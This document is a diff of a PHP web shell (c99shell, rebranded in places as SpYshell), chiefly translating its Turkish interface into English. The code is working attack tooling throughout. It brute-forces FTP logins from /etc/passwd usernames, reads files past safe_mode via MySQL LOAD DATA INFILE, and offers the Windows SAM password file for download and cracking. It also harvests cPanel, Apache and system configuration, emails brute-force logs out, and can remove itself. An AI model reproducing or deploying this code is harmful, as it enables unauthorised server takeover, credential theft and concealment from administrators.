+       echo "<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"><img src=\"".$surl."act=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"></a>&nbsp;";
        echo "</td>";
        echo "</tr>";
       }
       mysql_free_result($result);
       echo "</table><hr size=\"1\" noshade><p align=\"left\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";
-      echo "<option value=\"\">Secildi:</option>";
-      echo "<option value=\"deleterow\">SIL/option>";
-      echo "</select>&nbsp;<input type=\"submit\" value=\"Tamam\"></form></p>";
+      echo "<option value=\"\">With selected:</option>";
+      echo "<option value=\"deleterow\">Delete</option>";
+      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
      }
     }
     else
@@ -1284,7 +1319,7 @@ if ($act == "sql")
      if (!$result) {echo mysql_smarterror();}
      else
      {
-      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Olusturd</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>";
+      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>";
       $i = 0;
       $tsize = $trows = 0;
       while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
@@ -1296,16 +1331,16 @@ if ($act == "sql")
        echo "<td><input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"></td>";
        echo "<td>&nbsp;<a href=\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\"><b>".$row["Name"]."</b></a>&nbsp;</td>";
        echo "<td>".$row["Rows"]."</td>";
-       echo "<td>".$row["Tip"]."</td>";
-       echo "<td>".$row["Olusturma Zamani"]."</td>";
-       echo "<td>".$row["Guncelleme Zamani"]."</td>";
+       echo "<td>".$row["Type"]."</td>";
+       echo "<td>".$row["Create_time"]."</td>";
+       echo "<td>".$row["Update_time"]."</td>";
        echo "<td>".$size."</td>";
-       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_empty\" alt=\"BOS\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\"><img src=\"".$surl."act=img&img=sql_button_insert\" alt=\"Sok :)\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;</td>";
+       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\"><img src=\"".$surl."act=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;</td>";
        echo "</tr>";
        $i++;
       }
       echo "<tr bgcolor=\"000000\">";
-      echo "<td><center><b></b></center></td>";
+      echo "<td><center><b>»</b></center></td>";
       echo "<td><center><b>".$i." table(s)</b></center></td>";
       echo "<td><b>".$trows."</b></td>";
       echo "<td>".$row[1]."</td>";
@@ -1315,7 +1350,7 @@ if ($act == "sql")
       echo "<td></td>";
       echo "</tr>";
       echo "</table><hr size=\"1\" noshade><p align=\"right\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";
-      echo "<option value=\"\">Sec:</option>";
+      echo "<option value=\"\">With selected:</option>";
       echo "<option value=\"tbldrop\">Drop</option>";
       echo "<option value=\"tblempty\">Empty</option>";
       echo "<option value=\"tbldump\">Dump</option>";
@@ -1323,7 +1358,7 @@ if ($act == "sql")
       echo "<option value=\"tbloptimize\">Optimize table</option>";
       echo "<option value=\"tblrepair\">Repair table</option>";
       echo "<option value=\"tblanalyze\">Analyze table</option>";
-      echo "</select>&nbsp;<input type=\"submit\" value=\"Tamam!\"></form></p>";
+      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
       mysql_free_result($result);
      }
     }
@@ -1333,20 +1368,20 @@ if ($act == "sql")
   else
   {
    $acts = array("","newdb","serverstatus","servervars","processes","getfile");
-   if (in_array($sql_act,$acts)) {?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Olustur yeni DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newdb"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Olustur"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php }
+   if (in_array($sql_act,$acts)) {?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newdb"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php }
    if (!empty($sql_act))
    {
     echo "<hr size=\"1\" noshade>";
     if ($sql_act == "newdb")
     {
      echo "<b>";
-     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DataBase \"".htmlspecialchars($sql_newdb)."\" Olusturma tamamlandi.</b><br>";}
-     else {echo "Olusturulamadi \"".htmlspecialchars($sql_newdb)."\".<br>Sebep:</b> ".mysql_smarterror();}
+     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
+     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
     }
     if ($sql_act == "serverstatus")
     {
      $result = mysql_query("SHOW STATUS", $sql_sock);
-     echo "<center><b>Server Durumu Kararsiz:</b><br><br>";
+     echo "<center><b>Server-status variables:</b><br><br>";
      echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
      while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
      echo "</table></center>";
@@ -1379,16 +1414,16 @@ if ($act == "sql")
      if ($select)
      {
       $created = false;
-      mysql_query("Olustur TABLE `tmp_file` ( `Gozleninen dosya guvenli mod da+open_basedir` LONGBLOB NOT NULL );");
+      mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
       mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
       $result = mysql_query("SELECT * FROM tmp_file;");
-      if (!$result) {echo "<b>Okuma Hatasi (Erisim Engellendi!)!</b>";}
+      if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}
       else
       {
        for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
        $f = "";
        while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}
-       if (empty($f)) {echo "<b>Dosya \"".$sql_getfile."\" yok veya Bo$!</b><br>";}
+       if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}
        else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}
        mysql_free_result($result);
        mysql_query("DROP TABLE tmp_file;");
@@ -1404,7 +1439,7 @@ if ($act == "sql")
  {
   $affected = @mysql_affected_rows($sql_sock);
   if ((!is_numeric($affected)) or ($affected < 0)){$affected = 0;}
-  echo "<tr><td><center><b>yapmacik(sahte) rows: ".$affected."</center></td></tr>";
+  echo "<tr><td><center><b>Affected rows: ".$affected."</center></td></tr>";
  }
  echo "</table>";
 }
@@ -1412,19 +1447,19 @@ if ($act == "mkdir")
 {
  if ($mkdir != $d)
  {
-  if (file_exists($mkdir)) {echo "<b>Klasor yap \"".htmlspecialchars($mkdir)."\"</b>: Obje Zaten Var..";}
-  elseif (!mkdir($mkdir)) {echo "<b>Klasor yap \"".htmlspecialchars($mkdir)."\"</b>: Giris Izin Vermedi";}
+  if (file_exists($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: object alredy exists";}
+  elseif (!mkdir($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: access denied";}
   echo "<br><br>";
  }
  $act = $dspact = "ls";
 }
 if ($act == "ftpquickbrute")
 {
- echo "<b>Ftp Hizli Sifre Alma :P By KingDefacer</b><br>";
- if (!win) {echo "Windows ta Calismaz haa ona goreeee SpyHackTeaM <br><br>";}
+ echo "<b>Ftp Quick brute:</b><br>";
+ if (!win) {echo "This functions not work in Windows!<br><br>";}
  else
  {
-  function ashftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)
+  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)
   {
    if ($fqb_onlywithsh) {$true = (!in_array($sh,array("/bin/false","/sbin/nologin")));}
    else {$true = true;}
@@ -1433,7 +1468,8 @@ if ($act == "ftpquickbrute")
     $sock = @ftp_connect($host,$port,$timeout);
     if (@ftp_login($sock,$login,$pass))
     {
-     echo "<a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"><b>Baglanildi.. ".$host." icin  Giris \"".$login."\" &  Sifre \"".$pass."\"</b></a>.<br>";																																    ob_flush();
+     echo "<a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"><b>Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"</b></a>.<br>";
+     ob_flush();
      return true;
     }
    }
@@ -1442,14 +1478,14 @@ if ($act == "ftpquickbrute")
   {
    if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}
    $fp = fopen("/etc/passwd","r");
-   if (!$fp) {echo "/etc/passwd -Sifre listesi alinamadi.";}
+   if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
    else
    {
     if ($fqb_logging)
     {
      if ($fqb_logfile) {$fqb_logfp = fopen($fqb_logfile,"w");}
      else {$fqb_logfp = false;}
-     $fqb_log = "FTP Hizli Brute (called SpYshell ".$shver.") Baslanan ".date("d.m.Y H:i:s")."\r\n\r\n";
+     $fqb_log = "FTP Quick Brute (called c99shell v. ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
      if ($fqb_logfile) {fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
     }
     ob_flush();
@@ -1458,10 +1494,10 @@ if ($act == "ftpquickbrute")
     while(!feof($fp))
     {
      $str = explode(":",fgets($fp,2048));
-     if (ashftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))
+     if (c99ftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))
      {
-      echo "<b>Baglanildi -->".getenv("SERVER_NAME")." a login \"".$str[0]."\" Ve sifre \"".$str[0]."\"</b><br>";
-      $fqb_log .= "Baglanildi -->".getenv("SERVER_NAME")." a login \"".$str[0]."\" ve Sifre \"".$str[0]."\", at ".date("d.m.Y H:i:s")."\r\n";
+      echo "<b>Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\"</b><br>";
+      $fqb_log .= "Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\", at ".date("d.m.Y H:i:s")."\r\n";
       if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
       $success++;
       ob_flush();
@@ -1469,29 +1505,29 @@ if ($act == "ftpquickbrute")
      if ($i > $fqb_lenght) {break;}
      $i++;
     }
-    if ($success == 0) {echo "No success. baglantilar!"; $fqb_log .= "No success. baglantilar!\r\n";}
+    if ($success == 0) {echo "No success. connections!"; $fqb_log .= "No success. connections!\r\n";}
     $ftpquick_t = round(getmicrotime()-$ftpquick_st,4);
-    echo "<hr size=\"1\" noshade><b>Done!</b><br>Total time (secs.): ".$ftpquick_t."<br>Toplam Baglanti: ".$i."<br>Success.: <font color=green><b>".$success."</b></font><br>Unsuccess.:".($i-$success)."</b><br>Connects per second: ".round($i/$ftpquick_t,2)."<br>";
+    echo "<hr size=\"1\" noshade><b>Done!</b><br>Total time (secs.): ".$ftpquick_t."<br>Total connections: ".$i."<br>Success.: <font color=green><b>".$success."</b></font><br>Unsuccess.:".($i-$success)."</b><br>Connects per second: ".round($i/$ftpquick_t,2)."<br>";
     $fqb_log .= "\r\n------------------------------------------\r\nDone!\r\nTotal time (secs.): ".$ftpquick_t."\r\nTotal connections: ".$i."\r\nSuccess.: ".$success."\r\nUnsuccess.:".($i-$success)."\r\nConnects per second: ".round($i/$ftpquick_t,2)."\r\n";
     if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
-    if ($fqb_logemail) {@mail($fqb_logemail,"SpYshell v. ".$shver." report",$fqb_log);}
+    if ($fqb_logemail) {@mail($fqb_logemail,"c99shell v. ".$shver." report",$fqb_log);}
     fclose($fqb_logfp);
    }
   }
   else
   {
-   $logfile = $tmpdir_logs."ashsh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
+   $logfile = $tmpdir_logs."c99sh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
    $logfile = str_replace("//",DIRECTORY_SEPARATOR,$logfile);
-   echo "<form action=\"".$surl."\"><input type=hidden name=act value=\"ftpquickbrute\"><br>Read first: <input type=text name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"><br><br>Users only with shell?&nbsp;<input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"><br><br>Logging?&nbsp;<input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked><br>Logging to file?&nbsp;<input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"><br>Logging to e-mail?&nbsp;<input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"><br><br><input type=submit name=submit value=\"Brute Yap\"></form>";
+   echo "<form action=\"".$surl."\"><input type=hidden name=act value=\"ftpquickbrute\"><br>Read first: <input type=text name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"><br><br>Users only with shell?&nbsp;<input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"><br><br>Logging?&nbsp;<input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked><br>Logging to file?&nbsp;<input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"><br>Logging to e-mail?&nbsp;<input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"><br><br><input type=submit name=submit value=\"Brute\"></form>";
   }
  }
 }
 if ($act == "d")
 {
- if (!is_dir($d)) {echo "<center><b>Permision Engelledi!</b></center>";}
+ if (!is_dir($d)) {echo "<center><b>Permision denied!</b></center>";}
  else
  {
-  echo "<b>Uzanti Bilgisi:</b><table border=0 cellspacing=1 cellpadding=2>";
+  echo "<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>";
   if (!$win)
   {
    echo "<tr><td><b>Owner/Group</b></td><td> ";
@@ -1499,13 +1535,13 @@ if ($act == "d")
    $gr = posix_getgrgid(filegroup($d));
    $row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));
   }
-  echo "<tr><td><b>Permissions(Engel)</b></td><td><a href=\"".$surl."act=chmod&d=".urlencode($d)."\"><b>".view_perms_color($d)."</b></a><tr><td><b>Olusturma Zamani:</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Giris Zamani:</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>Modifiye Zamani:</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table><br>";
+  echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&d=".urlencode($d)."\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table><br>";
  }
 }
-if ($act == "phpinfo") {@ob_clean(); phpinfo(); ashshexit();}
+if ($act == "phpinfo") {@ob_clean(); phpinfo(); c99shexit();}
 if ($act == "security")
 {
- echo "<center><b>Server Guvenlik Bilgisi:</b></center><b>Dizin: ".$hopenbasedir."</b><br>";
+ echo "<center><b>Server security information:</b></center><b>Open base dir: ".$hopenbasedir."</b><br>";
  if (!$win)
  {
   if ($nixpasswd)
@@ -1532,34 +1568,34 @@ if ($act == "security")
  else
  {
   $v = $_SERVER["WINDIR"]."\repair\sam";
-  if (file_get_contents($v)) {echo "<b><font color=red>Winnt Sifresini Kiramazssin :( (".$v.") </font></b><br>";}
-  else {echo "<b><font color=green>Sen winnt Sifresini Kirabilirsin dostum :)<a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Indir</b></u></a>, ve kullan lcp.crack+ .</font></b><br>";}
+  if (file_get_contents($v)) {echo "<b><font color=red>You can't crack winnt passwords(".$v.") </font></b><br>";}
+  else {echo "<b><font color=green>You can crack winnt passwords. <a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+ ©.</font></b><br>";}
  }
- if (file_get_contents("/etc/userdomains")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=userdomains&d=".urlencode("/etc")."&ft=txt\"><u><b>SpyHaCKeRz.CoM</b></u></a></font></b><br>";}
- if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=accounting.log&d=".urlencode("/var/cpanel/")."\"&ft=txt><u><b>Cpanel Loglarini Gor</b></u></a></font></b><br>";}
- if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/usr/local/apache/conf")."&ft=txt\"><u><b>Apache Konfigirasyon (httpd.conf)</b></u></a></font></b><br>";}
- if (file_get_contents("/etc/httpd.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Apache Konfigirasyon (httpd.conf)</b></u></a></font></b><br>";}
- if (file_get_contents("/etc/syslog.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=syslog.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Syslog Konfigirasyon (syslog.conf)</b></u></a></font></b><br>";}
- if (file_get_contents("/etc/motd")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=motd&d=".urlencode("/etc")."&ft=txt\"><u><b>Gunluk Mesaj</b></u></a></font></b><br>";}
+ if (file_get_contents("/etc/userdomains")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=userdomains&d=".urlencode("/etc")."&ft=txt\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>";}
+ if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=accounting.log&d=".urlencode("/var/cpanel/")."\"&ft=txt><u><b>View cpanel logs</b></u></a></font></b><br>";}
+ if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/usr/local/apache/conf")."&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}
+ if (file_get_contents("/etc/httpd.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}
+ if (file_get_contents("/etc/syslog.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=syslog.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>";}
+ if (file_get_contents("/etc/motd")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=motd&d=".urlencode("/etc")."&ft=txt\"><u><b>Message Of The Day</b></u></a></font></b><br>";}
  if (file_get_contents("/etc/hosts")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=hosts&d=".urlencode("/etc")."&ft=txt\"><u><b>Hosts</b></u></a></font></b><br>";}
  function displaysecinfo($name,$value) {if (!empty($value)) {if (!empty($name)) {$name = "<b>".$name." - </b>";} echo $name.nl2br($value)."<br>";}}
- displaysecinfo("Isletim sistemi",myshellexec("cat /proc/version"));
+ displaysecinfo("OS Version?",myshellexec("cat /proc/version"));
  displaysecinfo("Kernel version?",myshellexec("sysctl -a | grep version"));
- displaysecinfo("Sinif Adi",myshellexec("cat /etc/issue.net"));
- displaysecinfo("Sinif adi (2)",myshellexec("cat /etc/*-realise"));
- displaysecinfo("Islemci",myshellexec("cat /proc/cpuinfo"));
+ displaysecinfo("Distrib name",myshellexec("cat /etc/issue.net"));
+ displaysecinfo("Distrib name (2)",myshellexec("cat /etc/*-realise"));
+ displaysecinfo("CPU?",myshellexec("cat /proc/cpuinfo"));
  displaysecinfo("RAM",myshellexec("free -m"));
- displaysecinfo("Hard Disk Alani",myshellexec("df -h"));
- displaysecinfo("Local Dizin",myshellexec("lsattr -a"));
- displaysecinfo("Disk Yazma Bilgileri ",myshellexec("cat /etc/fstab"));
- displaysecinfo("cURL Yuklu?",myshellexec("which curl"));
- displaysecinfo("lynx Yuklu?",myshellexec("which lynx"));
- displaysecinfo("links Yuklu?",myshellexec("which links"));
- displaysecinfo("fetch Yuklu?",myshellexec("which fetch"));
- displaysecinfo("GET Yuklu?",myshellexec("which GET"));
- displaysecinfo("perl Yuklu?",myshellexec("which perl"));
- displaysecinfo("Apache yuklu yer ?",myshellexec("whereis apache"));
- displaysecinfo("Perl Yuklu yer ?",myshellexec("whereis perl"));
+ displaysecinfo("HDD space",myshellexec("df -h"));
+ displaysecinfo("List of Attributes",myshellexec("lsattr -a"));
+ displaysecinfo("Mount options ",myshellexec("cat /etc/fstab"));
+ displaysecinfo("Is cURL installed?",myshellexec("which curl"));
+ displaysecinfo("Is lynx installed?",myshellexec("which lynx"));
+ displaysecinfo("Is links installed?",myshellexec("which links"));
+ displaysecinfo("Is fetch installed?",myshellexec("which fetch"));
+ displaysecinfo("Is GET installed?",myshellexec("which GET"));
+ displaysecinfo("Is perl installed?",myshellexec("which perl"));
+ displaysecinfo("Where is apache",myshellexec("whereis apache"));
+ displaysecinfo("Where is perl?",myshellexec("whereis perl"));
  displaysecinfo("locate proftpd.conf",myshellexec("locate proftpd.conf"));
  displaysecinfo("locate httpd.conf",myshellexec("locate httpd.conf"));
  displaysecinfo("locate my.conf",myshellexec("locate my.conf"));
@@ -1577,7 +1613,7 @@ if ($act == "mkfile")
 }
 if ($act == "encoder")
 {
- echo "<script>function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script><center><b>Cyriptos:</b></center><form name=\"encoder\" action=\"".$surl."\" method=POST><input type=hidden name=act value=encoder><b>Girilen Veri:</b><center><textarea name=\"encoder_input\" id=\"input\" cols=50 rows=5>".@htmlspecialchars($encoder_input)."</textarea><br><br><input type=submit value=\"Tamam\"><br><br></center><b>Hashes</b>:<br><center>";
+ echo "<script>function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script><center><b>Encoder:</b></center><form name=\"encoder\" action=\"".$surl."\" method=POST><input type=hidden name=act value=encoder><b>Input:</b><center><textarea name=\"encoder_input\" id=\"input\" cols=50 rows=5>".@htmlspecialchars($encoder_input)."</textarea><br><br><input type=submit value=\"calculate\"><br><br></center><b>Hashes</b>:<br><center>";
  foreach(array("md5","crypt","sha1","crc32") as $v)
  {
   echo $v." - <input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$v($encoder_input)."\" readonly><br>";
@@ -1613,31 +1649,31 @@ if ($act == "fsbuff")
  $arr_copy = $sess_data["copy"];
  $arr_cut = $sess_data["cut"];
  $arr = array_merge($arr_copy,$arr_cut);
- if (count($arr) == 0) {echo "<center><b>Tampon Bos</b></center>";}
- else {echo "<b>Dosya Sistem' in Tampon u</b><br><br>"; $ls_arr = $arr; $disp_fullpath = true; $act = "ls";}
+ if (count($arr) == 0) {echo "<center><b>Buffer is empty!</b></center>";}
+ else {echo "<b>File-System buffer</b><br><br>"; $ls_arr = $arr; $disp_fullpath = true; $act = "ls";}
 }
 if ($act == "selfremove")
 {
  if (($submit == $rndcode) and ($submit != ""))
  {
-  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using SpYshell v.".$shver."!"; ashshexit(); }
-  else {echo "<center><b>Silinemedi :(  ".__FILE__."!</b></center>";}
+  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using c99shell v.".$shver."!"; c99shexit(); }
+  else {echo "<center><b>Can't delete ".__FILE__."!</b></center>";}
  }
  else
  {
-  if (!empty($rndcode)) {echo "<b>Hata: Yanlis konfirmation</b>";}
+  if (!empty($rndcode)) {echo "<b>Error: incorrect confimation!</b>";}
   $rnd = rand(0,9).rand(0,9).rand(0,9);
-  echo "<form action=\"".$surl."\"><input type=hidden name=act value=selfremove><b>Self-remove: ".__FILE__." <br><b>Eminmisin ? <br>Dogrulama gir \"".$rnd."\"</b>:&nbsp;<input type=hidden name=rndcode value=\"".$rnd."\"><input type=text name=submit>&nbsp;<input type=submit value=\"Evet\"></form>";
+  echo "<form action=\"".$surl."\"><input type=hidden name=act value=selfremove><b>Self-remove: ".__FILE__." <br><b>Are you sure?<br>For confirmation, enter \"".$rnd."\"</b>:&nbsp;<input type=hidden name=rndcode value=\"".$rnd."\"><input type=text name=submit>&nbsp;<input type=submit value=\"YES\"></form>";
  }
 }
-if ($act == "update") {$ret = ashsh_getupdate(!!$confirmupdate); echo "<b>".$ret."</b>"; if (stristr($ret,"new version")) {echo "<br><br><input type=button onclick=\"location.href='".$surl."act=update&confirmupdate=1';\" value=\"Update now\">";}}
